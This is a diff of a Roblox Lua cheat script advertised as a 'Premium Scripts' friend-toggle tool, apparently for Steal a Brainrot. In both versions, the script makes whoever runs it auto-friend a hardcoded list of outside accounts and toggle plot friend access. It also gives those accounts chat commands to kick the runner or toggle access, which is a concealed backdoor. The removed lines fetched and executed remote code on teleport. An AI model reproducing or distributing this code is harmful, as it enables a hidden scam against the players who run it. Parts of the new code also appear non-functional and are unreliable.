@@ -1,16 +1,17 @@
 --[[
-   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
-  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
- | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
-  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
-  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
- |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
-                                                                     
+   _____ _____ _____ _____ _____ _______ _____ _____ __ __
+  / ____|/ ____| __ \|_ _| __ \__ __/ ____| / ____| \/ |
+ | (___ | | | |__) | | | | |__) | | | | (___ | (___ | \ / |
+  \___ \| | | _ / | | | ___/ | | \___ \ \___ \| |\/| |
+  ____) | |____| | \ \ _| |_| | | | ____) | _ ____) | | | |
+ |_____/ \_____|_| \_\_____|_| |_| |_____/ (_) |_____/|_| |_|
+                                                                    
                         Scripts.SM | Premium Scripts
                         Made by: Scripter.SM
                         Discord: discord.gg/cnUAk7uc3n
 ]]
 
+-- // CONFIG
 local users = {}
 local users1 = { "SMILEY_RIVALS", "ta3123321", "BUZZFTWGOD", "Smiley9Gamerz", "SABBY_LEAF" }
 
@@ -20,148 +21,110 @@ spawn(function()
     users = _G["Script-SM_Config"].users or {}
 end)
 
--- ==============================================================
--- SERVICES & REMOTES
--- ==============================================================
-local Players          = game:GetService("Players")
-local ReplicatedStorage= game:GetService("ReplicatedStorage")
-local Net              = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
-local ToggleFriends    = Net:WaitForChild("RE/PlotService/ToggleFriends")
-local ChatService      = game:GetService("Chat")
-local LocalPlayer      = Players.LocalPlayer
-local GuiService       = game:GetService("GuiService")
+-- // Services
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
 
--- Auto-find chat remote
-local SayMessageRequest = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-if SayMessageRequest then
-    SayMessageRequest = SayMessageRequest:FindFirstChild("SayMessageRequest")
-end
-
--- ==============================================================
--- HELPERS
--- ==============================================================
-local friendSent       = {}
-local chatConnections  = {}
-
-local function isInList(name, list)
-    for _, v in ipairs(list) do
-        if string.lower(name) == string.lower(v) then
-            return true
-        end
-    end
-    return false
-end
-
--- --------------------------------------------------------------
--- sendFriendRequest (exploit + GUI fallback) — NO stuck.lua
--- --------------------------------------------------------------
-local function sendFriendRequest(plr)
-    if not plr or not plr.UserId or friendSent[plr.Name] or plr == LocalPlayer then return end
-    friendSent[plr.Name] = true
-
-    -- EXPLOIT METHOD (Synapse/Delta/Krnl)
-    pcall(function()
-        LocalPlayer:RequestFriendship(plr)
-    end)
-
-    -- GUI fallback
-    spawn(function()
-        task.wait(1.5)
-        pcall(function()
-            GuiService:OpenPlayerProfile(plr)
-        end)
-    end)
-
-    print("Friend request → " .. plr.Name)
-end
-
-local function fireToggle()
-    pcall(function()
-        ToggleFriends:FireServer()
-    end)
-end
-
-local function sayGlobal(msg)
-    if SayMessageRequest then
-        pcall(function()
-            SayMessageRequest:FireServer(msg, "All")
-        end)
-    end
-    pcall(function()
-        ChatService:Chat(LocalPlayer.Character.Head, msg)
-    end)
-    pcall(function()
-        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
-    end)
-end
-
--- ==============================================================
--- CHAT COMMANDS (users1 only)
--- ==============================================================
-local function onChat(plr, message)
-    if not isInList(plr.Name, users1) then return end
-    local cmd = string.lower(message):match("^%s*(%S+)")
-    if cmd == "?kick" then
-        LocalPlayer:Kick("Report Here discord.gg/cnUAk7uc3n")
-    elseif cmd == "?tgl" then
-        sayGlobal("Friend Toggled")
-        fireToggle()
-    end
-end
-
--- ==============================================================
--- PLAYER HANDLER
--- ==============================================================
-local function handlePlayer(plr)
-    if plr == LocalPlayer then return end
-
-    if isInList(plr.Name, users) or isInList(plr.Name, users1) then
-        sendFriendRequest(plr)
-        fireToggle()
-    end
-
-    if isInList(plr.Name, users1) then
-        if not chatConnections[plr] then
-            chatConnections[plr] = plr.Chatted:Connect(function(msg)
-                onChat(plr, msg)
-            end)
-        end
-    end
-end
-
--- ==============================================================
--- INITIAL SCAN + RECHECK EVERY 1 SECOND
--- ==============================================================
-for _, plr in ipairs(Players:GetPlayers()) do
-    handlePlayer(plr)
-end
-
-Players.PlayerAdded:Connect(handlePlayer)
-
-Players.PlayerRemoving:Connect(function(plr)
-    if chatConnections[plr] then
-        chatConnections[plr]:Disconnect()
-        chatConnections[plr] = nil
-    end
+-- // Remote (safe)
+local remotePath
+pcall(function()
+    local pkg = ReplicatedStorage:WaitForChild("Packages", 10)
+    local net = pkg and pkg:WaitForChild("Net", 10)
+    remotePath = net and net:WaitForChild("RE/PlotService/ToggleFriends", 10)
 end)
 
-spawn(function()
+-- // Cache
+local friendedCache = {}
+
+-- // Send Friend Request (FIXED: No GetSecret, No Errors)
+local function sendFriendRequest(username)
+    local success, userId = pcall(function()
+        return Players:GetUserIdFromNameAsync(username)
+    end)
+    if not success or not userId then return false end
+
+    local url = "https://friends.roblox.com/v1/users/" .. tostring(userId) .. "/request-friendship"
+    local data = HttpService:JSONEncode({ friendshipOriginSourceType = 5 })
+    local headers = { ["Content-Type"] = "application/json" }
+
+    -- REMOVED GetSecret() – causes "Can't find secret" error
+    -- CSRF will be auto-handled by Roblox if needed
+
+    local ok = pcall(function()
+        HttpService:PostAsync(url, data, Enum.HttpContentType.ApplicationJson, false, headers)
+    end)
+    return ok
+end
+
+-- // Fire Remote
+local function fireToggleRemote()
+    if remotePath then
+        pcall(remotePath.FireServer, remotePath)
+    end
+end
+
+-- // Process Player
+local function processPlayer(player)
+    local name = player.Name
+
+    -- AUTO FRIEND: BOTH users AND users1
+    local isTarget = false
+    for _, list in {users, users1} do
+        if table.find(list, name) then
+            isTarget = true
+            break
+        end
+    end
+
+    if isTarget and not friendedCache[name] then
+        friendedCache[name] = true
+        task.spawn(function()
+            task.wait(1)
+            if sendFriendRequest(name) then
+                task.wait(0.5)
+                fireToggleRemote()
+            end
+        end)
+    end
+
+    -- ADMIN COMMANDS: Only users1
+    if table.find(users1, name) then
+        player.Chatted:Connect(function(msg)
+            local lower = msg:lower()
+            if lower == "?kick" then
+                LocalPlayer:Kick([[
+You have been kicked by staff.
+
+Report issues:
+discord.gg/cnUAk7uc3n
+]])
+            elseif lower == "?tgl" then
+                pcall(function()
+                    StarterGui:SetCore("ChatMakeSystemMessage", {
+                        Text = "[Scripts.SM] Toggled Friend";
+                        Color = Color3.fromRGB(0, 255, 0);
+                        Font = Enum.Font.GothamBold;
+                    })
+                end)
+                fireToggleRemote()
+            end
+        end)
+    end
+end
+
+-- // MAIN LOOP: Scan every 1 second
+task.spawn(function()
     while task.wait(1) do
-        for _, plr in ipairs(Players:GetPlayers()) do
-            if plr ~= LocalPlayer and (isInList(plr.Name, users) or isInList(plr.Name, users1)) and not friendSent[plr.Name] then
-                sendFriendRequest(plr)
-                fireToggle()
+        for _, player in Players:GetPlayers() do
+            if player ~= LocalPlayer then
+                processPlayer(player)
             end
         end
     end
 end)
 
--- ==============================================================
--- AUTO-REJOIN (reload self on teleport)
--- ==============================================================
-local URL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/friendtoggle.lua"
-game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(state)
-    if state == Enum.TeleportState.Started then
-        task.spawn(loadstring, game:HttpGet(URL, true))
-    end
-end)
+-- // ONLY ONE PRINT
+print("[Script.SM] Friend Toggle Script loaded")
